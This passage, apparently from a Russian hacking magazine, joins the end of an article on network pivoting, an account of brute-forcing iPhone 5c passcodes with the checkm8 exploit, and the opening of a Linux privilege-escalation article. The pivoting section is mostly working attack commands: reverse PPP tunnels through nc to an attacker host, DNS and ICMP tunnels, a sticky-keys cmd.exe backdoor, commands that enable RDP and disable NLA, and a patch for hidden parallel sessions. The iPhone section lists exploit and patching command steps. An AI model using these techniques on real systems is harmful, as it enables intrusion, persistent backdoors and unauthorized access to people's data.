attacker> sudo pppd noauth pty 'nc ‐klp 5555'
victim#> pppd noauth persist pty 'nc attacker 5555' 172.16.0.1:172.
16.0.2

Туннель создан. Теперь, чтобы превратить victim в gateway, нужно проделать
следующее:


victim#> echo 1 > /proc/sys/net/ipv4/ip_forward
victim#> iptables ‐t nat ‐A POSTROUTING ‐o eth0 ‐j MASQUERADE

Готово, c этого момента мы можем направлять тра фик во внутреннюю сеть
как есть, используя только роутинг:


attacker> sudo route add ‐net 10.0.0.0/8 dev tun0

Стоит отметить, что, используя pppd, мы можем соз давать туннель по ини‐
циативе любой из сторон (victim или attacker). Это значит, что мы получили
возможность обой ти проблемы с межсетевыми экранами. Для работы тре‐
буется поддержка ядра (модуль ppp_generic).
  А вот еще один способ поднять туннель, исполь зуя IPIP:


attacker> sudo ip tunnel add tun0 mode ipip remote victim local
attacker dev eth0
attacker> sudo ifconfig tun0 172.16.0.2/30 pointopoint 172.16.0.1
victim#> ip tunnel add tun0 mode ipip remote attacker local victim
dev eth0
victim#> ifconfig tun0 172.16.0.1/30 pointopoint 172.16.0.2


VPN туннель через SSH (L2/L3-туннели)
Если на victim или attacker есть SSH‐сервер, то этого достаточно, чтобы соз‐
дать VPN. Сперва нужно раз решить под ключение в /etc/ssh/sshd_config:


PermitTunnel point‐to‐point

После этого можно создать подклю чение:


attacker> sudo ssh ‐N tun@victim ‐w 0:0
attacker> sudo ifconfig tun0 172.16.0.1/30 pointopoint 172.16.0.2
victim#> ifconfig tun0 172.16.0.2/30 pointopoint 172.16.0.1
attacker> sudo route add ‐net 10.0.0.0/8 dev tun0
victim#> echo 1 > /proc/sys/net/ipv4/ip_forward
victim#> iptables ‐t nat ‐A POSTROUTING ‐o eth0 ‐j MASQUERADE

Для организации доступа в сеть L3‐туннеля будет дос таточно. Но если мы
хотим  не  просто  прос канировать  порты,  а  выполнять  атаки,  такие
как ARP/NBNS/DHCP‐spooﬁng, то пот ребуется L2‐туннель. Для этого про‐
писываем в /etc/ssh/sshd_config следующее:


PermitTunnel ethernet

Перезапускаем SSH‐сервер и выполняем подклю чение:


attacker> sudo ssh root@victim ‐o Tunnel=ethernet ‐w any:any
victim#> brctl addbr br0; brctl addif br0 eth0; brctl addif br0 tap0;
 ifconfig eth0 0 promisc; ifconfig br0 10.0.0.70/24
attacker> sudo dhclient tap0

Как всегда, с L2‐туннелями нужно быть очень осторожным: из‐за малейшей
ошибки при создании мос тов удален ная машина уйдет в вечный офлайн.


VPN-туннели на Windows
Windows из коробки тоже поддерживает VPN (в варианте PPTP/L2TP). Более
того, управлять можно из командной строки благодаря встроенному ком‐
поненту:


victim#> rasdial.exe netname username * /phonebook:network.ini

Конфиг для network.ini выглядит следующим обра зом:


[netname]
MEDIA=rastapi
Port=VPN9‐0
DEVICE=rastapi
PhoneNumber=attacker

Отключают VPN‐соединения следующей командой:


victim#> rasdial netname /disconnect

Не стоит забывать про клас сический OpenVPN, который прекрасно работает
и на Linux, и на Windows. При наличии прав админис тратора его исполь‐
зование не должно вызвать проб лем.
   Также достаточ но экзо тичес кий, но действенный способ L2‐туннелиро‐
вания на Windows через виртуализацию был описан в моей прошлой статье.


VPN-туннель через ICMP
Если выход в интернет запрещен, но разрешены пинги, то можно восполь‐
зоваться hans и в две команды создать L3‐туннель (172.16.0.1 на attacker
и 172.16.0.10 на victim):


attacker> sudo ./hans ‐s 172.16.0.1 ‐p passwd
victim#> ./hans ‐c attacker ‐p passwd ‐a 172.16.0.10

Клиентская сторона для Windows работает ана логичным образом, но для
работы пот ребуется tap‐интерфейс, который мож но создать с помощью
OpenVPN.


VPN-туннель через DNS
В последний раз возвращаемся к DNS. Если в настройках DNS разрешены
резолвы произвольных доменов, что быва ет достаточно час то, то с помощью
iodine мы можем создать полноценный L3‐туннель (172.16.0.1 на attacker
и 172.16.0.2 на victim):


attacker> sudo ./iodined ‐f 172.16.0.1 ‐P passwd attacker.tk
victim#> ./iodine ‐f ‐P passwd attacker.tk

VPN‐туннели можно организовать как напрямую между attacker и victim, так
и сочетанием разных техник проброса портов. Нап ример, мы можем вместо
DNS‐туннеля iodine использовать сочета ние DNS2TCP + pppd.
  Подводя итог под этим разделом, я бы добавил, что использование VPN‐
туннелей хоть и дает комфортный доступ в сеть, все же не обязательный этап
в проникновении. Если это нельзя выполнить легко, то тратить время на траб‐
лшутинг нецеле сооб разно. Почти всегда дос таточно старого доброго прок‐
сирования трафика.


ОРГАНИЗАЦИЯ GUI
Очень много проб лем при пос тэкс плуатации соз дают GUI‐программы. Нес‐
мотря на то что мы всегда предпочитаем командную строку, от GUI невоз‐
можно полностью избавиться.
  В Linux в ходе постэксплу ата ции, как пра вило, крайне редко требуется
GUI — почти все программы имеют CLI‐интерфейс, а система обычно выс‐
тупает в роли сервера. Да и сама ОС предлагает дос таточно гибкие решения
для предоставления GUI.
  Другое дело с Windows. У подавляющего большинства программ просто
нет консольного интерфейса. Настра ивают сис тему во многом с исполь‐
зованием GUI. То же относится и к некоторым хакерским инструментам
под Windows. С одной стороны, в Windows всег да есть встроенный RDP
для удаленных графических сеансов, но с дру гой — на клиентских версиях
Windows, которых большинс тво, их использование приведет к блокировке
сеанса текущего поль зователя. Пользователь начнет в ответ выкидывать
нашу сессию, и подоб ные «качели» в итоге вызовут тревогу у безопасников.


Быстрая GUI-сессия
Есть старый, но безотказный трюк под наз ванием sticky keys, позволя ющий
запускать программы, не выполняя вхо да в Windows:


victim#> reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
Image File Execution Options\sethc.exe' /v Debugger /t reg_sz /d '\
windows\system32\cmd.exe'

Рекомендую использовать этот метод именно через обработчик запус ка
программы, а не через замену файла cmd.exe → sethc.exe, так как анти‐
вирусы такое иногда палят.
   Если вдруг RDP окажется отключен, можно сделать следующее:


victim#> reg add 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal
Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f
victim#> sc config TermService start= auto
victim#> net start TermService
victim#> netsh.exe firewall add portopening TCP 3389 'Remote Desktop'
victim#> netsh advfirewall firewall add rule name='Remote Desktop'
dir=in action=allow protocol= TCP localport= 3389

Также убедимся, что на удаленной машине нет NLA:


victim#> reg add 'HKLM\system\currentcontrolset\control\Terminal
Server\WinStations\RDP‐Tcp' /v UserAuthentication /t REG_DWORD /d
0x0 /f

Описанный метод прост и кра сив — подключаемся по RDP и вместо логона
жмем пять раз Shift.





      Подклю чение по RDP с сохранением пользовательской сессии





               Работает этот метод как на XP, так и на 10

Этот прием не раз выручал меня, ког да требова лось запустить GUI‐прог‐
рамму.
  Но увы, у него есть минус: так как полноценная RDP‐сессия при запуске
программ подоб ным образом не создается, у нас будет лишь пара минут,
пока мы не отвалимся по тайм‐ауту. Час то этого времени оказывается дос‐
таточно. Но если нет?


Параллельный доступ по RDP
Как было сказано, главная проблема — не заблокировать сессию залогинен‐
ного пользователя. Существует несколько решений для патчинга службы
termservice и снятия огра ничений на количес тво одновременных сес сий.
Наиболее проверенным вариантом ока зался rdpwrap. Патчим RDP и делаем
его мультисессионным одной командой:


victim#> RDPWInst.exe ‐i ‐s

Проект, увы, не поддерживает Windows XP, тут пригодится другое решение:


victim#> termsrv_patcher.exe ‐‐patch

Теперь, используя временную локальную или доменную  учетку, можно
логиниться по RDP и открывать ярлыки на рабочем столе victim, пока тот
работает в своей сессии и ничего не подозрева ет:


attacker> rdesktop victim


ВЫВОДЫ
Pivoting — это большой этап работ ста дии постэксплу атации. Я постарал ся
осветить связанные с ним задачи в хронологичес ком порядке:
 • перенос файлов;
 • проброс портов и обход файрволов;
 • получение доступа в сеть через прокси или VPN.

Конечно, встре чаются более специфичные случаи, чем представленные
в статье. Однако, исполь зуя сочета ния представленных приемов, можно вый‐
ти победителем из любой ситуации.
  Недостаточный pivoting может привес ти к досадной неудаче, когда был
произведен взлом, получены требуемые пра ва, но конечная цель не взята
из‐за каких‐то технических формальнос тей — атакующий был за NAT и не мог
принять обратный шелл или программу не уда лось запустить из‐за необ‐
ходимости GUI, а поль зователь постоянно завершал RDP‐сеанс.
  Видно, что многие приемы pivoting’а мож но использовать без прав адми‐
нистратора или root.
  Существует некий стереотип, что пос ле получения доступа к системе сле‐
дует обязательно поднять привилегии. Да, админис тративные права — это,
конечно, хорошо. Однако на моей практике было два показательных случая,
когда проникновение происходило и с Windows, и с Linux, причем без прав
суперпользователя. Быстрые попытки поднятия привилегий не привели
к успеху, но так ли это было нужно? Даже без административных прав ата‐
кованные системы впол не можно было использовать для пересылки трафика
во внутреннюю сеть, в которой найти уяз вимый компонент и получить на нем
полные права, как правило, не так уж и слож но. В результате в обоих слу чаях
контроллеры доменов пали и вся внут ренняя инфраструктура была захвачена.
  Даже одна, самая незначительная RCE может привести к фатальным пос‐
ледствиям для всей инфраструктуры, всего бизнеса. Никакие фай рволы
и прочие превентивные меры не способны сдержать хакера, который уже
успел проникнуть в сеть.
 ВЗЛОМ

        ТОТ САМЫЙ


     Олег Афонин
  Эксперт по мобильной
криминалистике компании
      «Элкомсофт»
aoleg@voicecallcentral.com     5C





   КАК МЫ СОЗДАЛИ СОФТВЕРНЫЙ МЕТОД
   ВСКРЫТИЯ ЗНАМЕНИТОГО IPHONE 5C



 iPhone 5c был последним смартфоном Apple, основанным
 на 32‐битном процессоре. В то же время это — знаковая
 модель, получив шая широкую известность после инцидента
 в Сан‐Бернардино. Пять лет назад взлом iPhone 5c тер‐
 рориста стал камнем преткновения и причиной жаркого спо‐
 ра между Apple и ФБР. Сегодня же взломать такой аппарат
 можно быстро и достаточно просто.


 Чем интересен iPhone 5c — по любым меркам серьезно устаревший
  телефон? Как минимум двумя вещами. С техничес кой точки зрения это пос‐
  ледняя модель iPhone, в которой нет сопроцес сора Secure Enclave, что поз‐
  воляет получить пол ный доступ к его содержимому, в том числе всем
  без исключения ключам шифрования. Взлом iPhone этой модели, по сути,
  последняя оставшаяся воз можность покопать ся во внутреннос тях подсисте‐
 мы безопасности iOS — в более новых моделях она становится недос тупной
  из‐за аппаратной защиты.
    Но инте ресна эта модель не только с техничес кой, но и с политической
  точки зре ния. Именно она ока залась местом столкновения интересов Apple
  и Федерального бюро рас следова ний.


 Историческая справка
  iPhone 5c, по сути проходная бюджетная модель, стал печально известным
  после террористической ата ки в Сан‐Бернардино в декабре 2015 года. При‐
  надлежавший работодателю стрелка телефон этой модели оказался заб‐
  локирован не известным ни самому работодателю, ни спецслужбам паролем
  из четырех цифр. Более того, устройство было настроено так, чтобы после
  десяти неудачных попыток подобрать пароль все данные были уничтожены.
 Судорожные метания привели к пос пешным пос тупкам. Работодатель тер‐
  рориста изменил пароль от iCloud, и создать свежую резервную копию
  в облаке стало невозможно. Работа спецслужб зас топорилась; для извле‐
  чения информации из телефо на был нужен код блокировки.
     Технических средств для взлома таких устройств в те годы не существо‐
  вало. Федеральное бюро расследова ний потребова ло, чтобы в Apple соз‐
  дали программное обес печение, которое позволило бы ФБР раз блокировать
  iPhone 5c террориста. В Apple отка зались создавать такое программное
  обеспечение (хотя чисто технически могли это сделать не напрягаясь). Было
  назначено судебное слушание. Одна ко за день до него обвинение поп‐
  росило отсрочку, заявив о существо вании третьей стороны, способной
  помочь в разблокировке. Еще через нес колько дней ФБР объявило, что аппа‐
  рат удалось разблокировать. Слу шание не сос тоялось, иск был отозван.
    До сих пор официально не сообщалось, каким методом воспользовалось
 ФБР для получения пароля и кто его раз работал. Однако нам известна при‐
 мерная сумма, уплаченная за взлом устройства: директор ФБР Джеймс Коми
  сказал в интервью, что взлом телефона обошелся ФБР более чем в 1,3 мил‐
  лиона долларов. Впрочем, имя подрядчика так и не обнародовали. Некото‐
 рые анонимные источники утвержда ют, что подрядчиком была израильская
  компания Cellebrite, которая не опровергла, но и не подтвердила это. Однако
  The Washington Post сооб щила, что, по словам очередных анонимных «людей,
  знакомых с вопросом», ФБР заплатило «профессиональным  хакерам»,
  которые использовали неопубликованную уяз вимость в программном обес‐
  печении iPhone.



 АЛЬТЕРНАТИВЫ
  У предложенного нами спо соба взло ма iPhone 5c есть несколько альтер‐
  натив. В первую очередь, конечно же, нужно упомянуть сугубо коммерческие
  продукты и сервисы компании Cellebrite. Эти решения дос тупны исключитель‐
  но правоохранительным орга нам, причем не каждой страны, а их стоимость
  составляет десятки тысяч долларов.
   В свое время перебирать коды бло кировки можно было при помощи аппа‐
  ратного «черного ящика» IP‐BOX и его кло нов. Основной недос таток всех
  этих устройств в том, что они не работают с современными версиями iOS:
  поддерживаются толь ко версии до 8.1 включительно. Второй недостаток —
  низкая скорость перебо ра: порядка шес ти секунд на попытку, 17 часов
  на взлом четырехзначного PIN‐кода.
    Еще одной попыткой стало решение за авторством Сергея Скоробогато‐
  ва. В своем проекте «Ана лиз безопас ности Apple iPhone 5c» Сергей про‐
  демонстрировал атаку, поз воляющую подоб рать код блокировки iPhone 5c.
  У метода, предложенного Сергеем,  также есть недостатки. Во‐первых,
  телефон потребуется разобрать, что не каждому по силам. Второй недос‐
  таток тот же, что и у IP‐BOX: скорость перебора не пре вышает одного пароля
  в пять секунд. Сам Сергей утвержда ет, что взломать четырехзначный код дос‐
  тупа можно примерно за сутки, а перебор шес тизначного PIN‐кода и вовсе
  бессмыслен.


 КАК ЭТО РАБОТАЕТ
 Мы создали чисто программный метод, поз воляющий запустить перебор
  паролей непосредствен но на самом  устройстве. Отвертка и паяльник
  для этого не нужны; достаточно простого кабеля Lightning. Наш метод базиру‐
  ется на хорошо изученном экспло ите checkm8, который, впрочем, неп‐
  ригоден для запуска атаки на пароль в чистом виде. В настоящий момент мы
  реализовали атаку только с компь ютеров Mac.
    Взлом iPhone 5c выглядит следующим образом.
    Для начала нам нужно загрузить на устройство свой собственный кас‐
  томный RAMDisk. Имен но с него выполняется перебор пароля. Загрузка кас‐
  томной (неподписанной) про шивки стала возможной благодаря BootROM‐
  эксплоиту checkm8. Для загрузки устрой ства и отключения всех проверок
  предпринимаем следующие шаги.


 Шаг 1. Переводим телефон в режим DFU
 На первом шаге необ ходимо ввести устройство в режим DFU. Это возможно
  только вручную; никакой команды, которая могла бы это сде лать, не сущес‐
  твует. Для iPhone 5c обна ружено нес колько вариантов перехода в нужный
  режим. Например, такой.





 При использовании ElcomSoft iOS Forensic Toolkit будут выданы инте рак‐
  тивные инструкции.





 Довольно простой нам кажется такая последова тельность.
    Начальное состояние: телефон должен быть выключен и не подключен
  к компьютеру.
   • Нажимаем кнопку Home (единственную/центральную на лицевой панели)
      и, удерживая ее, подключаем кабель Lightning. Отпускаем Home, когда
    на экране устрой ства появится картинка «Подклю читесь к iTunes».
   • Одновременно зажимаем Home и Sleep/Power (кнопка блокировки на вер‐
    хнем торце устрой ства) и удерживаем их в течение восьми секунд (на
    некоторое время на экране появится логотип Apple).
   • Отпускаем  кнопку  Sleep/Power,  но  продолжаем  удерживать Home
    еще восемь секунд.

  Если все сделано правильно, экран аппарата оста нется черным, а в iTunes
  или Finder (в зависимос ти от используемой версии macOS) телефон появится
  как iPhone in recovery mode (режим вос становления).





 Все готово к сле дующим шагам.


 Шаг 2. Эксплоит DFU
 На этом шаге проводим загрузку в режим pwned DFU по методу, который
  используется в экспло ите checkm8. Этот эксплоит инте ресен тем, что исполь‐
  зует аппаратную уязвимость в загрузчике BootROM, которая не может быть
  исправлена обновле нием прошивки. На устрой ствах с Secure Enclave (все 64‐
  битные модели iPhone начиная с iPhone 5s) таким образом можно сделать
  джейлбрейк, но запустить быстрый перебор паролей не удастся: Secure En‐
  clave ограничит скорость перебо ра на аппаратном уровне. А вот iPhone 5c —
  идеальный кандидат: аппа ратного соп роцес сора безопасности нет, можно
  делать практически что угодно.
    Вопрос: зачем в таком случае взламывать код блокировки? Не проще ли
  сразу извлечь из телефона данные? Увы, без кода блокировки извлечь
  получится очень ограниченное количес тво информа ции. Основной массив
  данных будет зашифрован, а ключ вычисляется на основе кода блокировки,
  который вводит пользователь пос ле заг рузки устройства. При этом и вынести
  перебор за пределы iPhone тоже нельзя; проверять код блокировки и вычис‐
  лять ключи шифрования должен процессор самого устройства.
   Однако продолжим. В результате работы эксплоита мы попадаем в режим,
  известный под неофициальным названием pwned DFU. Это все еще режим
 DFU (то есть система не заг ружена), но у нас появился доступ к системным
 файлам (таким образом можно уста новить джейлбрейк checkra1n) и  к
  RAMDisk устройства.
    Нас сейчас интересу ет именно RAMDisk. Для запуска атаки на код бло‐
  кировки нам нужно запус тить наш собственный код. Однако для запуска
  неподписанного приложения одного лишь эксплоита мало, так как мы должны
  пропатчить проверку подписи на каждом этапе загрузки, а именно в фай лах
  из прошив ки iBSS, iBEC и kernelcache.


 Шаг 3. Отключаем проверки подписи
 На этом шаге мы патчим проверку под писи в iBSS. В iBEC же не только пат‐
  чится проверка подписи, но и уста навливаются следующие параметры заг‐
  рузки:


  boot‐args: "rd=md0 ‐v amfi=0xff cs_enforcement_disable=1"

  Благодаря этим парамет рам мы получаем verbose boot и отключаем проверку
  подписи у ядра.
    Для загрузки устрой ства нужен еще один файл — DeviceTree. Он представ‐
  ляет собой иерархическое описание аппа рат ных устройств, которые затем
  будет использовать ядро. Этот файл патчить не нужно.


 Шаг 4. Патчим RAMDisk
 Еще один важный файл, который загружа ется на устройство, — сам RAMDisk.
 В контексте операционной системы iOS RAMDisk — это виртуальный диск
  с файловой системой, который хра нится в оперативной памяти устройства.
   В качестве основы возь мем Restore RAMDisk из официальной прошивки
  Apple и модифицируем его. В штатный RAMDisk добавим стандартные ути‐
  литы командной строки (bash, mkdir, ls и другие) — без них мы не сможем
  потом получить доступ к командной стро ке и выполнять команды на устрой‐
  стве. Но прежде всего в рамдиск необходимо загрузить сервер SSH, чтобы
  иметь возможность подклю читься к телефону с компьюте ра. Для этого ско‐
  пируем на RAMDisk sshd c необходимыми фай лами конфигурации и пропат‐
  чим утилиту restored_exteral (она изна чально есть на рамдиске), чтобы она
  сразу же после загрузки рамдиска поднимала сервер SSH.


                                       Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       ТОТ САМЫЙ 5C
              КАК МЫ СОЗДАЛИ СОФТВЕРНЫЙ МЕТОД
               ВСКРЫТИЯ ЗНАМЕНИТОГО IPHONE 5C





Шаг 5. Патч ядра
Теперь нам нужно пропат чить ядро (kernelcache).
  Изначально iPhone 5c вышел с iOS 7.0; последняя версия iOS, доступная
для этого телефона, — 10.3.4. Начиная с iOS 10 (а мы загружаем прошивку
именно этой версии) для запус ка приложения недостаточно прос то отключить
проверку подписи. Помимо этого, необ ходимо, чтобы хеш исполняемого
файла находился в так называемом AMFI trust_cache. Соответственно, пер‐
вым делом отключаем проверку trust_cache (иначе sshd и пропатченная ути‐
лита restored_external просто не запустятся).
   Второй важный патч связан с тем, что для перебора пароля нам нужен
доступ к аппаратному ключу 0x835, но по умолчанию этот ключ недоступен
из userland. Мы дол жны пропатчить один из драй веров, чтобы получить доступ
к этому ключу и иметь воз можность перебирать коды блокировки из userland.
   Таким образом, порядок загрузки следующий: pwned DFU → iBSS → iBEC
→ DeviceTree → RAMDisk → kernelcache.
   Чтобы этого добиться, потребуются инстру менты pwned DFU (есть только
в версии для macOS) и iRecovery (macOS и Windows).
   Вот последовательность команд, которая при водит к нужному результату:
 • pwnedDFU p — выполняем сам экс плоит checkm8;
 • pwnedDFUf iBSS.n41ap — загружа ем iBSS на устройство;
 • irecovery f iBEC.n41ap — загружа ем iBEC на устройство;
 • irecovery f DeviceTree.n41ap — загружа ем DeviceTree на устрой‐
   ство;
 • irecovery c devicetree — выполняем команду devicetree;
 • irecovery f ramdisk10 — загружа ем RAMDisk на устройство;
 • irecovery c ramdisk — выполняем команду RAMDisk;
 • irecovery  f  kernelcache.n41ap —  загружаем  kernelcache
   на устройство.

В данном примере ramdisk10 и kernelcache.n41ap — пропатченные версии
стандартного RAMDisk и kernelcache, а iBSS.n41ap и iBEC.n41ap, соот ветс‐
твенно, патченные версии iBSS и iBEC.





Иногда на одном из этапов воз никает ошиб ка.





В таких случаях нужно перезаг рузить телефон (а порой и компьютер; ошибка
может возникать из‐за проблемы в USB‐драйвере, которая лечится только
перезагрузкой). После это го надо заново ввести телефон в режим DFU и про‐
делать все шаги снова.


Шаг 6. Монтируем разделы
После того как мы пропатчили и загрузили все фай лы, нужно смонтировать
разделы устройства, чтобы иметь доступ к его фай ловой сис теме. Сис темный
раздел находится в /dev/disk0s1s1, пользовательский в /dev/disk0s1s2. Нам
интересен именно пользовательский, так что монтируем его к /mnt2:


mount ‐o rw ‐t hfs /dev/disk0s1s2 /mnt2

Обрати внимание: несмотря на то что мы успешно смонтировали поль‐
зовательский раздел, большая часть данных на нем остается недоступной
из‐за сквозного пофай лового шифрования. Дос тупна лишь небольшая часть
данных, необходимая для успешной загрузки устройства и, например, приема
входящих звонков и сооб щений.
  Следующая команда сохранит содержимое пользовательского раздела
в архив tar:


ssh ‐p 3022 root@localhost tar ‐c /mnt2 | dd of=<path_to_output_file>

Кстати, если все, что тебе нужно, — это дамп поль зовательского раздела, то
нет никакой необходимос ти проделывать все ука занные операции вручную:
достаточно установить джейлбрейк checkra1n и воспользоваться готовым
набором скриптов iPhone‐rootFS‐tool. Толку с такого дампа, однако, немного:
без пароля (а мы, напомню, находимся в режиме хоть и pwned, но DFU) мы
не сможем расшифровать пользовательские данные — по крайней мере
большую их часть.
  В статье Джеймса Даффи Speed > Security — Apple’s Approach To iOS Data
Security рассказывается о том, какие данные с пользовательского раздела
доступны без пароля. Сюда вхо дят:
 • список учетных записей электронной почты;
 • логины в социальные сети — например, можно найти идентификатор учет‐
   ной записи SnapChat;
 • для некоторых приложений — уникальные идентификаторы чатов и кон‐
   тактов (их в незашифрованном виде хранят, к примеру, все тот же
   SnapChat и WhatsApp);
 • история доступа к сетям Wi‐Fi;
 • история сетевой активнос ти приложений (база данных /private/var/
  wireless/Library/Databases/DataUsage.sqlite);
 • сетевые настройки (содержимое /private/var/preferences/);
 • сообщения голосовой почты (в пап ке /private/var/mobile/Library/
  Voicemail/);
 • история данных местоположения (дос таточно огра ниченная, но все же);
 • частичный доступ к медиафайлам;
 • список установленных приложений и краткая информация об истории
   использования;
 • небольшая часть содержимого «Связки ключей»; конкретно — записи
   с   атрибутами  kSecAttributeAccessibleAlwaysThisDeviceOnly
   и kSecAttrAccessibleAlways.

О «Связке ключей» нужно рассказать чуть подробнее. Атрибуты из последне‐
го пункта используются для тех типов записей из «Связки ключей», которые
должны быть доступны сразу пос ле загрузки устройства. С одной стороны,
это немного: основной массив паролей, сертифика тов и ключей становится
доступным только после первой разблокировки устройства. С другой —
пароли от учетных записей mail.ru и rambler.ru почему‐то были сохранены
именно с этим классом защиты. Я не могу ска зать, в какой именно версии
приложений созданы эти записи; попытка вос произвести ситуацию с пос‐
ледними версиями приложений провалилась. Однако пароли в режиме BFU
были найдены.
  Набор скриптов SPIDER поможет извлечь из образа незашиф рованные
файлы и базы дан ных.
  Основная же часть дан ных зашифрована, а вычислить ключ можно лишь
после взлома кода блокировки. На этом этапе устройство считаем загружен‐
ным; переходим ко взло му пароля.


ВЗЛОМ ПАРОЛЯ
Итак, мы организовали связь с компьютером и получи ли сре ду, позволяющую
запускать неподписанные приложения. Теперь нуж но запустить непосредс‐
твенно перебор пароля (кода блокировки экрана). Этим делом занимается
утилита passcode нашей собственной раз работки, которую мы предваритель‐
но загрузили на RAMDisk вмес те с дру гими утилита ми командной строки.
  Сам пароль как таковой на устройстве не сохраняется ни в открытом, ни в
зашифрованном виде. iOS проверяет правиль ность введенного пароля сле‐
дующим образом. На основе введенного пользователем PIN‐кода формиру‐
ется так называемый парольный ключ, который используется для расшифров‐
ки ключей классов защиты (class keys). Если при помощи введенного поль‐
зователем пароля удалось успешно рас шифро вать все ключи классов
защиты, то пароль считается пра виль ным, а соответствующие ключи можно
использовать для расшифровки пользовательских данных.
   Как уже упоминалось, про верка пароля выполняется на самом устройстве.
При этом разница в производитель нос ти меж ду ста реньким iPhone 5c и сов‐
ременным iPhone 11 скорее на порядки, чем в разы. Разработчики Apple пос‐
тарались сделать так, чтобы разблокировка любого iPhone занимала у поль‐
зователя одно и то же время. Количес тво итераций откалибровано таким
образом, чтобы соот ветству ющие ключи рас шифровывались за 80 мс. Это и
есть максимальная скорость перебо ра паролей, демонстрируемая утилитой
passcode.





Алгоритм проверки пароля выглядит следующим образом. В iOS есть спе‐
циальная сущность System Keybag, в которой хранятся зашифрованные ключи
каждого  класса  защиты.  Сам  System  Keybag  хранится  в  файле
/private/var/keybags/systembag.kb. Этот файл, в свою очередь, зашиф‐
рован алгоритмом AES_CBC_256 на ключе BAG1, который хранится в Eﬀaceable
Storage.
   У расшифрованной «сумки ключей» есть заголо вок (header) и спи сок
зашифрованных клю чей. Из заголовка нам важ но получить такую информа‐
цию, как тип пароля (0 — PIN из четырех или шес ти цифр, 1 — чис ловой про‐
извольной длины, 2 — символьный про извольной длины), соль и количество
итераций.





                      Варианты паролей

При переборе мы вычисляем парольный ключ с помощью алгоритма PKD‐
F2_HMAC_SHA1. На вхо де — очередной вариант пароля, соль и количество
итераций из заголовка. Далее мы «растягиваем» вычисленный ключ (key
stretching) c помощью аппа ратного ключа 0x835, получая таким образом
новый ключ на основе ключей 0x835 и passcode key. Наконец, на последнем
шаге мы пытаемся полученным ключом расшифровать ключи классов защиты.
Если все клю чи успешно расшифровались, то пароль считается правильным.
Если нет — переходим к следующему варианту.





СКОРОСТЬ РАБОТЫ: ПАРОЛЬ ИЗ ЧЕТЫРЕХ ИЛИ ШЕСТИ ЦИФР
Современные версии iOS по умолчанию предлагают защитить устройство
паролем из шести цифр. Переключиться на четырехзначный PIN можно, но не
нужно: благодаря биомет ричес ким датчикам (Touch ID и Face ID) вводить код
блокировки тебе потребуется очень редко (как правило, не чаще раза в нес‐
колько дней). Соот ветственно, небольшое неудобс тво можно и потерпеть
в пользу значительно возросшей безопасности.
  А вот iPhone 5c биометричес ким датчиком не оборудован; код блокировки
пользователю приходится вводить каждый раз для доступа к телефону.
В результате на этом устройстве по умол чанию предлагается установить
четырехзначный PIN. Более того, даже если ты установишь пароль из шести
цифр, а потом захочешь его сменить, система вновь предложит тебе ввес ти
пароль из четырех цифр.
  Задержка между попытками в 80 мс дает скорость перебора в 13,6 пароля
в секунду. Полностью перебрать все комбинации из четырех цифр можно
за двенадцать минут.
  Пароли, состоящие из шести цифр, перебирают ся с той же скоростью;
полный перебор занимает порядка 21 ч, одна ко реальное время раз бло‐
кировки может быть значитель но меньше. Причина здесь в том, что некото‐
рые пароли встречаются чаще других, и эта ста тистика нам известна. Чаще
всего, как ни странно это звучит, пользователи при думывают пароли из так
называемого черного списка. Если ты попыта ешься установить в качестве
пароля, скажем, код 000000 или 123456, то система предупредит тебя
о потенциальной небезо пасности такого пароля — но все‐таки разрешит
тебе его использовать. Многие уста навлива ют такие пароли по принципу
«никто не догадается».





Полный список паролей из «черного списка» можно извлечь, проанализи‐
ровав образ iOS при помощи Malus‐Security/iExtractor. Делается это доволь‐
но просто; ниже — пример кода, который был использован авторами иссле‐
дования Extracting iOS’s passcode blacklist (PDF):


VERSION="13.3.1_17D50"
CODENAME="YukonD17D50.D22D221OS"
FILE="dyld_shared_cache_arm64" # or "dyld_shared_cache_armv7s" for
iOS 7 to 10.3
hdiutil attach decrypted.dmg
strings /Volumes/$CODENAME/System/Library/Caches/$FILE | \
grep "\bSecPasswordSeparator\b" ‐A 120 > blacklist_iOS_$VERSION.txt
hdiutil unmount $CODENAME

Во время атаки инструментарий в первую очередь опробует самые час то
используемые пароли (к примеру, 123456, 000000, 343434), во вторую —
пароли, в которых может быть закодирова на дата (день рождения поль‐
зователя или одного из членов семьи — весь ма распространенный циф‐
ровой пароль). Лишь в том случае, если не сработает ни одна из этих атак,
время отработки которых составляет примерно полтора часа, программа
вклю чит режим пол ного перебо ра.


БУКВЕННО-ЦИФРОВЫЕ ПАРОЛИ
Скорости в 13,6 пароля в секунду достаточно для взлома паролей, состоящих
только из цифр (до шести вклю читель но). Сложность же буквенно‐цифровых
паролей такова, что взломать их за разумное время не представляется воз‐
можным. Соответственно, в настоящий момент взламывать буквенно‐циф‐
ровые пароли мы даже не пытаемся. Но если ты попробуешь это сделать, то
рекомендую  восполь зоваться  сло варем —  например,  сос тавленным
из известных паролей пользователя.
ВЗЛОМ
ПРАВО
                                                                                      f0x1sland
                                                                                      f0x1sland@protonmail.com
НА
ROOT




КАК ПОВЫШАЮТ
ПРИВИЛЕГИИ
В LINUX





С правами рута ты можешь делать в системе что угодно: зак‐
репиться на будущее, оста вив бэкдор, внедрить  руткит
или  троян,  забрать,  изменить  или  уничтожить  любую
информацию — хоть разместить задницу на главной стра‐
нице сайта, если захватил веб‐сервер. Поэтому повышение
привилегий в сис теме — один из важнейших шагов при ата‐
ках. В этой статье мы посмотрим, как это делается в сис‐
темах с Linux.


В общем случае эскалация привилегий — это получение прав в сис теме
выше, чем у тебя уже есть. Но чаще всего имеется в виду получение доступа
к учетной записи root в Linux или system/administrator в Windows.
  Почему становится возможным повысить права в системе, казалось бы
призванной предотвращать подобное? При чин много. Вот, как мне кажется,
основные:
 • уязвимости в приложениях/скрип тах;
 • неверная конфигура ция ОС и приложений;
 • забытые критически важ ные данные (пароли, логины, бэкапы и прочее);
 • уязвимости в ядре ОС.

Ну а основная причина всегда одна и та же — людские ошибки. В иде альной
вселенной, скорее всего, повысить привилегии не удалось бы. Но человечес‐
кий фактор делает это возможным, поэто му нас лаждаемся.


С ЧЕГО НАЧАТЬ?
Прежде чем что‐то делать, нужно понять, с чем мы будем иметь дело. Конеч‐
но, кое‐что мы узнаем о системе, изучив ее на этапе проникновения,
но теперь нужно подробнее выяс нить, что именно нам может помочь под‐
няться до root.
